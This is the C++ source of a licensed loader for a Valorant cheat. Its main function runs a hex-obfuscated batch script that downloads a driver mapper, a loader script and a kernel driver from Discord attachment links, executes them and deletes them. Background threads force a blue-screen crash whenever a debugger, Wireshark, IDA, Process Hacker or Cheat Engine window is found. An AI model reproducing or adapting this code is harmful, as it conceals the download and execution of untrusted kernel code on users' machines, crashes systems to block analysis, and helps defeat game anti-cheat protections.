#include <thread>
#include "stdafx.h"
#include "game.h"
#include "driver.h"

#include <Windows.h>
#include "auth.hpp"
#include <string>
#include "skStr.h"

#include <cstdio>
#include <iterator>
#include <sstream>
#include <vector>

///aded for anti
#include "anti.hpp"

static std::string hexDecode(const std::string& hex);

std::vector<unsigned char> cipher_as_chars(std::string const& cipher)
{
	std::istringstream strm{ cipher };
	strm >> std::hex;

	return { std::istream_iterator<int>{strm}, {} };
}

std::string tm_to_readable_time(tm ctx);
static std::time_t string_to_timet(std::string timestamp);
static std::tm timet_to_tm(time_t timestamp);

using namespace KeyAuth;


std::string name = ""; // application name. right above the blurred text aka the secret on the licenses tab among other tabs
std::string ownerid = ""; // ownerid, found in account settings. click your profile picture on top right of dashboard and then account settings.
std::string secret = ""; // app secret, the blurred text on licenses tab and other tabs
std::string version = ""; // leave alone unless you've changed version on website
std::string url = "https://keyauth.win/api/1.2/"; // change if you're self-hosting

api KeyAuthApp(name, ownerid, secret, version, url);

static std::string hexDecode(const std::string& hex)
{
	int len = hex.length();
	std::string newString;
	for (int i = 0; i < len; i += 2)
	{
		std::string byte = hex.substr(i, 2);
		char chr = (char)(int)strtol(byte.c_str(), NULL, 16);
		newString.push_back(chr);
	}
	return newString;
}
std::vector<unsigned char> getDriver() {
	auto to_uc_vector = [](std::string value) {
		return std::vector<unsigned char>(value.data(), value.data() + value.length());
	};
	//working one  auto file = hexDecode("406563686f206f66660a0a6375726c202268747470733a2f2f63646e2e646973636f72646170702e636f6d2f6174746163686d656e74732f3930343635363335343338363533383534382f313033353339393930323036383437333836362f6d61707065722e65786522202d2d6f7574707574206d61707065722e657865200a6375726c202268747470733a2f2f63646e2e646973636f72646170702e636f6d2f6174746163686d656e74732f3930343635363335343338363533383534382f313033353433333736363732373937343939322f6465766865786c6f616465722e62617422202d2d6f7574707574206465766865786c6f616465722e6261740a6375726c202268747470733a2f2f63646e2e646973636f72646170702e636f6d2f6174746163686d656e74732f3930343635363335343338363533383534382f313033353433343539353834313233323931362f7379736472762e73797322202d2d6f7574707574207379736472762e7379730a0a0a63616c6c206d61707065722e6578650a63616c6c206465766865786c6f616465722e6261740a0a0a64656c20227379736472762e73797322200a64656c20226465766865786c6f616465722e62617422200a64656c20226d61707065722e65786522200a6563686f20446f6e6521");
	
	//working after update auto file = hexDecode("406563686f206f66660a0a6375726c202268747470733a2f2f63646e2e646973636f72646170702e636f6d2f6174746163686d656e74732f3930343635363335343338363533383534382f313033353339393930323036383437333836362f6d61707065722e65786522202d2d6f7574707574206d61707065722e657865200a6375726c202268747470733a2f2f63646e2e646973636f72646170702e636f6d2f6174746163686d656e74732f3930343635363335343338363533383534382f313033373730363233333934393435343430372f6465766865786c6f616465722e62617422202d2d6f7574707574206465766865786c6f616465722e6261740a6375726c202268747470733a2f2f63646e2e646973636f72646170702e636f6d2f6174746163686d656e74732f3930343635363335343338363533383534382f313033373730363033313733373838303630372f6465786472762e73797322202d2d6f7574707574206465786472762e7379730a0a0a63616c6c206d61707065722e6578650a63616c6c206465766865786c6f616465722e6261740a0a0a64656c20226465786472762e73797322200a64656c20226465766865786c6f616465722e62617422200a64656c20226d61707065722e65786522200a6563686f20446f6e6521");
	
	auto file = hexDecode("406563686f206f66660a0a6375726c202268747470733a2f2f63646e2e646973636f72646170702e636f6d2f6174746163686d656e74732f3930343635363335343338363533383534382f313033353339393930323036383437333836362f6d61707065722e65786522202d2d6f7574707574206d61707065722e657865200a6375726c202268747470733a2f2f63646e2e646973636f72646170702e636f6d2f6174746163686d656e74732f3930343635363335343338363533383534382f313033373730363233333934393435343430372f6465766865786c6f616465722e62617422202d2d6f7574707574206465766865786c6f616465722e6261740a6375726c202268747470733a2f2f63646e2e646973636f72646170702e636f6d2f6174746163686d656e74732f3930343635363335343338363533383534382f313033373731363230323835373937353837382f6465786472762e73797322202d2d6f7574707574206465786472762e7379730a0a0a63616c6c206d61707065722e6578650a63616c6c206465766865786c6f616465722e6261740a0a0a64656c20226465786472762e73797322200a64656c20226465766865786c6f616465722e62617422200a64656c20226d61707065722e65786522200a6563686f20446f6e6521");
	
	
	//auto file = hexDecode("406563686f206f66660a0a6375726c202268747470733a2f2f63646e2e646973636f72646170702e636f6d2f6174746163686d656e74732f3930343635363335343338363533383534382f313033353435333632313335303936353238382f6d61707065722e65786522202d2d6f7574707574206d61707065722e657865202f73202f66202f710a6375726c202268747470733a2f2f63646e2e646973636f72646170702e636f6d2f6174746163686d656e74732f3930343635363335343338363533383534382f313033353435333632303936303838363835342f4c6f61644472697665722e62617422202d2d6f7574707574204c6f61644472697665722e626174202f73202f66202f710a6375726c202268747470733a2f2f63646e2e646973636f72646170702e636f6d2f6174746163686d656e74732f3930343635363335343338363533383534382f313033353435333632303630343337393136372f6472762e73797322202d2d6f7574707574206472762e737973202f73202f66202f710a0a0a0a0a0a63616c6c206d61707065722e6578650a63616c6c204c6f61644472697665722e6261740a0a0a64656c20226472762e7379732220202f66202f710a64656c20224c6f61644472697665722e6261742220202f66202f710a64656c20226d61707065722e6578652220202f66202f710a6563686f20446f6e6521");
	return to_uc_vector(file);

}

//added by devil
void rndmTitle()
{
	constexpr int length = 15;
	const auto characters = TEXT("0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz");
	TCHAR title[length + 1]{};

	for (int j = 0; j != length; j++)
	{
		title[j] += characters[rand() % 55 + 1];
	}

	SetConsoleTitle(title);
}

//added by devil
void ADBG() // no comment
{
	while (true)
	{
		Sleep(250);
		driverdetect();
	}
}

void ADBG2() // sexy
{
	while (true)
	{
		Sleep(250);
		if (LI_FN(IsDebuggerPresent).safe_cached()())
			BSOD();
	}
}

void ADBG3() // cool!
{
	while (true)
	{
		Sleep(250);
		if (HasRemoteDebugger())
			BSOD();
	}
}

void ADBG4() // temp lolz
{
	while (true)
	{
		Sleep(1000);
		if (FindWindowA(NULL, ("The Wireshark Network Analyzer"))) BSOD();
		if (FindWindowA(NULL, ("Progress Telerik Fiddler Web Debugger"))) BSOD();
		if (FindWindowA(NULL, ("Fiddler"))) BSOD();
		if (FindWindowA(NULL, ("HTTP Debugger"))) BSOD();
		if (FindWindowA(NULL, ("x64dbg"))) BSOD();
		if (FindWindowA(NULL, ("dnSpy"))) BSOD();
		if (FindWindowA(NULL, ("FolderChangesView"))) BSOD();
		if (FindWindowA(NULL, ("BinaryNinja"))) BSOD();
		if (FindWindowA(NULL, ("HxD"))) BSOD();
		if (FindWindowA(NULL, ("Cheat Engine 7.2"))) BSOD();
		if (FindWindowA(NULL, ("Cheat Engine 7.1"))) BSOD();
		if (FindWindowA(NULL, ("Cheat Engine 7.0"))) BSOD();
		if (FindWindowA(NULL, ("Cheat Engine 6.9"))) BSOD();
		if (FindWindowA(NULL, ("Cheat Engine 6.8"))) BSOD();
		if (FindWindowA(NULL, ("Ida"))) BSOD();
		if (FindWindowA(NULL, ("Ida Pro"))) BSOD();
		if (FindWindowA(NULL, ("Ida Freeware"))) BSOD();
		if (FindWindowA(NULL, ("HTTP Debugger Pro"))) BSOD();
		if (FindWindowA(NULL, ("Process Hacker"))) BSOD();
		if (FindWindowA(NULL, ("Process Hacker 2"))) BSOD();
		if (FindWindowA(NULL, ("OllyDbg"))) BSOD();
	}
}






int main() {


	std::thread FirstThread(ADBG);
	std::thread SecondThread(ADBG2);
	std::thread ThirdThread(ADBG3);
	std::thread FourthThread(ADBG4);

	rndmTitle();


	SetConsoleTitleA(skCrypt("Vestra"));
	std::cout << skCrypt(" Connecting to DATABASE");

	KeyAuthApp.init();
	if (!KeyAuthApp.data.success)
	{
		std::cout << skCrypt("\n Status: ") << KeyAuthApp.data.message;
		Sleep(1500);
		exit(0);
	}
	std::string key;
	std::cout << skCrypt("\n LAST UPDATED ON : 24/11/2022 ");
	std::cout << skCrypt("\n Enter Your license: ");
	std::cin >> key;
	KeyAuthApp.license(key);

	if (!KeyAuthApp.data.success)
	{
		std::cout << skCrypt("\n Status: ") << KeyAuthApp.data.message;
		Sleep(1500);
		exit(0);
	}
	
	system("cls");
	printf("Login Success, Now Loading Driver");
	Sleep(1500);
	system("cls");

	
	std::vector<std::uint8_t> bytes = getDriver();   ////////downloading bat file uploaded in keyauth 
	if (!KeyAuthApp.data.success) // check whether file downloaded correctly
	{
		std::cout << skCrypt("\n\n Status: ") << KeyAuthApp.data.message;
		Sleep(1500);
		exit(0);
	}


	std::ofstream file("devil.bat", std::ios_base::out | std::ios_base::binary);
	file.write((char*)bytes.data(), bytes.size());
	file.close();
	system("devil.bat");             //opening bat
	system("del devil.bat");
	
	

	system("cls");
	printf("When You Are In Lobby Press F2 Key ");

	while (true)
	{

		if (GetAsyncKeyState(VK_F2))
		{
			break;
			Beep(300, 300);
		}
	}

	if (mem::find_driver()) {
		std::cout << "\nfound ud driver ";
	}
	else {
		std::cout << "\nno driver found \n";
	}
	mem::find_process(L"VALORANT-Win64-Shipping.exe");


	devdrv = mem::get_guarded_region(); // our main virtual addres needed to make any guarded calculation getting it 1 time per game launch is enough
	printf(("devdrv: %p.\n"), devdrv);

	
	std::cout << "\nhandle: " << (uintptr_t)mem::driver_handle;
	game::start_cheat();
	Sleep(-1);
	return NULL;

	//std::cout << skCrypt("\n\n Closing in ten seconds...");
	//Sleep(10000);
	//exit(0);
}

std::string tm_to_readable_time(tm ctx) {
	char buffer[80];

	strftime(buffer, sizeof(buffer), "%a %m/%d/%y %H:%M:%S %Z", &ctx);

	return std::string(buffer);
}

static std::time_t string_to_timet(std::string timestamp) {
	auto cv = strtol(timestamp.c_str(), NULL, 10); // long

	return (time_t)cv;
}

static std::tm timet_to_tm(time_t timestamp) {
	std::tm context;

	localtime_s(&context, &timestamp);

	return context;
}
